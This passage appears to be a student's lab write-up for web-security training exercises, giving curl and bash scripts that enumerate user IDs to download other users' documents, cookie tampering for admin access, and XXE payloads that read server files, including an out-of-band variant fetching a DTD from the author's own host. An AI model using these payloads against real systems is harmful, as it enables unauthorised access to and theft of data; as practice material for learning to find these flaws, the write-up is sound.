...
Opening the documents page we quickly see that the uid is no longer displayed as a get paramter.

But looking in Burp we quickly see all that was changed was that its a post parameter now.

So I can use this to get documents:
`
curl 'http://94.237.49.182:48669/documents.php' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Cache-Control: max-age=0' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Origin: http://94.237.49.182:48669' \
  -H 'Proxy-Connection: keep-alive' \
  -H 'Referer: http://94.237.49.182:48669/' \
...
The regex doesn't work on this page so I can do this to get the document links:
```
curl 'http://94.237.49.182:48669/documents.php' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  ...
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36' \
  --data-raw 'uid=1' \
  --insecure | grep "<li class='pure-tree_link'>" | cut -d "=" -f3 | cut -d "'" -f2
...
curl 'http://94.237.49.182:48669/documents.php' \
  ...
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36' \
  --data-raw 'uid=1' \
  --insecure | grep "<li class='pure-tree_link'>" | cut -d "=" -f6 | cut -d "'" -f2
```

Then I can run a bash script like this:
``` bash
#!/bin/bash
...
for i in {1..20}; do
        for link in $(curl "$url/documents.php" --data-raw "uid=$i" | grep "<li class='pure-tree_link'>" | cut -d "=" -f3 | cut -d "'" -f2); do
                wget -q $url/$link
        done
done
...
for i in {1..20}; do
        for link in $(curl "$url/documents.php" --data-raw "uid=$i" | grep "<li class='pure-tree_link'>" | cut -d "=" -f6 | cut -d "'" -f2); do
                wget -q $url/$link
        done
done
...
This does actually return all the pdfs, but fails to get the txt file. So I just used the curl command and output the result of the greps. I then find that the file is called `http://94.237.49.182:48669/documents/flag_11dfa168ac8eb2958e38425728623c98.txt`

Then I just curled that.
...
The contracts page has this code:
``` javascript
    function downloadContract(uid) {
...
And if we look in burp it clearly trys to open contract by base64 encoding the uid and then url encoding it.

So we should be able to just use this:
``` bash
#!/bin/bash
...
Then I can run `cat contract_*` and get the answer
...
Just opening the put request in Burp and changing the request method to Get, then updating the ID gets this to work.
...
We need to know the uid to change it.

We can run a curl script like
``` BASH
#!/bin/bash
...
With this we find it is uid 10.

Now we can change the json in the put request to something like:
``` json
...
And we can update the uid in the original request to 10.

So updating the email didn't return the flag... but I just changed my cookie to staff_admin on my index page and got it.
...
The file read for the email works as defined in this section.
So defining an entity like:
``` xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=connection.php">
]>
```
works and then we can just inspect the element in Burp to decode the result.

Attempting to DDOS this server with the above code also does not work.
...
I choose to use CDATA. So the first thing I do is:
`echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd`
...
<!DOCTYPE email [
  ...
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://10.10.14.117:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
```

And I put this in the email field `&joined;`

But it doesn't return results... when I test it on the previous file connection.php it works though. So it might be that I looking in the wrong place for flag.php. Lets just try `file:///flag.php`
...
The question int his section is:
...
So I just copy this into a file:
``` http
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.29.195
Content-Length: 147
...
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.29.195
Referer: http://10.129.29.195/blind/
...
Then I can run:
`ruby XXEinjector.rb --host=10.10.14.117 --httpport=8000 --file=10.129.201.94.test --path=/327a6c4304ad5938eaf0efb6cc3e53dc.php --oob=http --phpfilter`

Then all I have to do is run:
`cat /Users/xxxx//Useful/Tools/XXEinjector/Logs/10.129.29.195/327a6c4304ad5938eaf0efb6cc3e53dc.php.log`
...
Pulling up the webpage I see a lot of buttons. The first thing I notice is that the settings page pops up with a reset password page.

I also see that some of the buttons I click on show what might be an IDOR in the url.

Finally I see that the Wed 03/07 and Thu 04/07 buttons reload the profile page.

The password reset page does not require confirmation of the old password. So if I can get another user, I can change their password maybe.

When i look at the requests for profile.php, I see that there is a uid=74. And there is a cooking with a PHPSESSID=2ovj4or20pkijuvi6cluebjcan;

The settings page has the same thing...

The reset.php script takes this:
```
uid=74&token=e51a8a14-17ac-11ec-8e67-a3c050fe0c26&password=Password1
```

I also this in the header of the logout page:
